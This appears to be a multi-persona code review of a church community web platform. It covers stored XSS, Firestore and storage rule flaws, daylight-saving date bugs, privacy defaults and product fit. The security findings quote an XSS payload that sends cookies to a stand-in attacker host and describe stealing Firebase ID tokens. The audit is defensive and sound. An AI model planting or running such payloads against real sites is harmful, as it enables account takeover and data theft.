🛡️The SentinelSecurity Hardliner
Compact take. The static public website renders Kete post HTML through `innerHTML` with zero sanitization. Any authenticated `canPostKete` user can ship arbitrary script/iframe/event-handler markup straight onto `kete.html`, `post.html`, and the homepage, where it executes under the production origin. The portal’s DOMPurify wrapper does not exist on the static site. Secondary finding: profile privacy toggles are enforced only in React, not in Firestore rules, so PII leaks to any authenticated member.

Vuln-001: Stored XSS on the public static site (CRITICAL). `post.html:400`, `post.html:505`, and `kete.html:433` all do `container.innerHTML = ... ${post.content} ...` directly. Grep DOMPurify in *.html and js/* returned zero hits. The portal sanitizes (`KetePostPage.tsx:177`); the static site does not. An author can publish a post containing <img src=x onerror=fetch('https://attacker/'+document.cookie)> or a javascript: iframe and it executes on `kiwichurch-1ef0f.web.app/post.html?id=…`. Same-origin reach means an attacker can pull Firebase ID tokens out of IndexedDB, hit Firestore as the victim, post DMs, exfiltrate the directory. Required fix: bundle DOMPurify into `js/main.js`, sanitize with the iframe-host allowlist from `KetePostPage.tsx:10-28`, never interpolate `post.title`, `post.excerpt`, `post.authorName`, `att.url`, `att.name` raw.

Vuln-002: Privacy toggles are client-side decoration (HIGH). `firestore.rules:74` is `allow read: if isAuthenticated()` for `/users/{userId}`. `MemberDetailModal.tsx:43-49` decides what to show based on the privacy map. Any authenticated member can `getDoc(doc(db,'users',targetId))` from the JS console and receive the full document — phone, email, dependants[], gallery[], bio. The toggles are theatre. Split sensitive fields into `/users/{id}/private/contact` with a rule that reads the target’s privacy map.

Vuln-003: Storage delete on user galleries (MEDIUM). `storage.rules:51-62` allows `delete: if isAuthenticated() && request.auth.uid == userId` for gallery, but the broader storage policy sets `allow delete: if false` everywhere else. Asymmetric authority. Pick one model.

Vuln-004: Group resource delete authority too wide (MEDIUM). `storage.rules:121` is `allow delete: if isAuthenticated()`. Any authenticated user can delete any group resource file from any gathering’s library. Firestore rule restricts the metadata to uploader/admin/host — file vanishes, metadata remains. DoS path for any logged-in member against every group’s shared files.

Vuln-005: `userProfiles` mirror has no role/active checks (LOW). `firestore.rules:104-107` lets any user write to their own `userProfiles/{userId}` doc with no field allowlist and no `isActive()` guard. Tighten the allowed-keys diff or remove this collection if it’s dead code.

Vuln-006: Notification flood vector (LOW-MEDIUM). `firestore.rules:299-313` lets any active authenticated user create unlimited notifications for any other user. No rate limit, no validation that `userId` actually corresponds to a related event. Anyone can spam any member’s notification panel and trigger Web Notifications API browser pop-ups. Add App Check + ReCAPTCHA Enterprise before launch.

🔥The ContrarianDevil’s Advocate
Compact take. Five features in one autopilot shipped without manual QA, on a platform serving older adults who will not file bug reports — they will quietly stop using it. The recurring-event date math is built on millisecond arithmetic across local-time midnights, which means any series spanning NZ daylight saving will drift by an hour and start landing on the wrong day. The attendee list shows raw Firestore user IDs instead of names, the privacy model defaults to leaking email and phone to every authenticated member, and there is no test in the repo verifying any of it.

The recurrence generator is the headline crack. `parseISODate` builds a `Date` at local midnight, then weekly and fortnightly advance with `i * 7 * DAY_MS`. NZ shifts between NZST and NZDT at 2am on the last Sunday of September and first Sunday of April. A weekly service started in mid-September that runs to October will, on the DST week, land on a Date whose hour is 23:00 the previous day. `toISODate` then reads `getDate()` from that drifted Date and writes the wrong YYYY-MM-DD. Six-event series, third event lands on Saturday instead of Sunday. Nobody catches it until grandma drives to an empty hall. `monthly` uses `setMonth` so it dodges this. Fix is trivial — increment via `setDate(d.getDate() + 7)` on a fresh clone — but it has to actually be fixed.

The attendee list in EventModal renders `selfLabel = isSelf ? 'You' : rsvp.userId`. That’s the Firestore document ID, a 28-character hash. Same with `Avatar size="sm" name={rsvp.userId}` — the avatar initials are computed from `Tk9p3rXYz…`. The “who’s going” list is unusable for anyone who isn’t themselves. This isn’t new this session but the family RSVP feature shipped on top of it.

`DEFAULT_PRIVACY` defaults `showEmail` and `showPhone` to true. Every existing user — every member who registered before this session — has no `privacy` field on their doc, so the spread resolves both to true. The directory modal now exposes email and phone for every member to every other authenticated member by default. Church members did not consent to a directory the day they signed up. Needs a migration script or a banner forcing the choice on next login.

`updateEventSeries` happily strips `date` and `recurrenceIndex` from updates and propagates everything else including `gatheringId`. If a host renames the series and changes the group, every future event jumps groups silently — including events members have already RSVP’d to. No audit trail, no notification, no “this will affect 47 RSVPs” warning.

The whole batch shipped with `npm run typecheck` as the only verification gate. Typecheck does not catch DST, does not catch userId-instead-of-name, does not catch privacy defaults that violate the audience’s expectations. There are no tests in this repo — never were — and autopilot just shipped 1,103 lines across five interlocking features. Do not deploy. Run through the recurrence path on a calendar that crosses 27 September 2026, click every attendee list, log in as a non-admin and check what you can see about other members. Then deploy.

🧬First Principles ThinkerProblem Reframer
Compact take. The platform is built on an unexamined assumption: that a church community needs a software product. Before shipping more features, the team should test whether engagement is bottlenecked by missing functionality or by something the software can’t fix (relational depth, leadership rhythms, a clear reason to log in on a Tuesday). Audit which features are actually used after 90 days; the answer probably reveals you’ve been optimising the wrong variable.

What problem is this actually solving? I’ve read CLAUDE.md three times and I still don’t know. There’s a member portal, a static site, a directory, a blog, polls, reactions, DMs, family RSVPs, recurring events, moderation queues, a Kete editor overhaul. Each one is built well. But what is the job-to-be-done? When a member at Hansons Lane wakes up on a Wednesday morning, what makes them open this app instead of texting Darryl or Julie?

Here’s the question I’d ask before writing another line of code. If you turned off the portal for thirty days and told the congregation to use group texts, a shared Google Calendar, and a printed directory, what would actually break? Not what would be inconvenient. What would break. The features that survive that question are the product.

Notice what the codebase is implicitly assuming. That members want a feed. That they want to discover events by browsing. That they want to message each other inside the church app rather than in WhatsApp where their family already is. The brief said “polls and surveys”, so polls got built. The brief said “file sharing”, so a resources library got built. The brief was written by someone who was also guessing. You’re building features-to-spec on a spec that nobody validated.

The Kete editor overhaul is the tell. Eighteen commits, a per-user permission flag, pre-allocated Firestore IDs, DOMPurify hook deduplication for HMR. Exquisite engineering. But how many Kete posts will exist in twelve months? Twenty? Two hundred? If it’s twenty, the right answer was probably a Google Doc with a shared folder, and the editor work was a beautifully executed answer to a question the church wasn’t asking.

Pick five members across the age range. Sit with them. Watch them try to do one thing in the portal without prompting. Then ask the leadership: what is the one behaviour change you’d pay for? Connection between Sundays? Faster event signup? New-member onboarding? Whatever the answer is, that becomes the product, and the rest gets ruthlessly hidden until it earns its way back in.
